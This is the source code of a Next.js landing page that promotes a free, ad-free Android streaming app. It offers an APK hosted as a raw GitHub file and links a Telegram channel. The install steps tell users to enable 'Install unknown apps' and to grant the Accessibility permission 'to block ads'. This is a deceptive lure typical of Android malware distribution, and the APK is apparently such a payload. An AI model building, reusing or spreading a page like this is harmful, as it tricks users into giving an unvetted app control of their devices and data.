// src/app/page.tsx
"use client";

export default function Home() {
  return (
    <main className="container">
      <img src="/site-logo.png" alt="App Logo" className="model-photo" />
      <div className="bio">
        🎬 Stream movies & series in HD<br />
        🚀 Fast • No ads • No login<br />
        📱 Android only
      </div>

      

      <div style={{ color: "#ff00ff", fontWeight: "bold", marginBottom: 20 }}>
        Watch preview • Download APK below
      </div>

    <video
        className="teaser-video"
        autoPlay
        muted
        loop
        playsInline
        src="/intro1.mp4"
      />




      <a
  href="https://github.com/eyenet1/affilliate/raw/main/latest1.apk"
  className="btn-green"
>
  ⬇ Download Onstream App
</a>
      <a
        href="https://t.me/movieboxapk12"
        target="_blank"
        className="btn"
      >
        📢 Join Telegram for Updates
      </a>

      <section style={{ maxWidth: 500, margin: "40px auto" }}>
        <h2 style={{ color: "#ff00ff", marginBottom: 10 }}>How to Install</h2>
        <ol style={{ textAlign: "left", lineHeight: 1.6 }}>
          <li>Download the APK file</li>
          <li>Open file & allow “Install unknown apps”</li>
		  <li>Allow Accessibility feature to "block ads”</li>
          <li>Tap Install</li>
          <li>Open app & enjoy</li>
        </ol>
      </section>

      <footer style={{ fontSize: 12, opacity: 0.6, marginTop: 40 }}>
        Educational testing build • No media hosted • © 2026
      </footer>
    </main>
  );
}
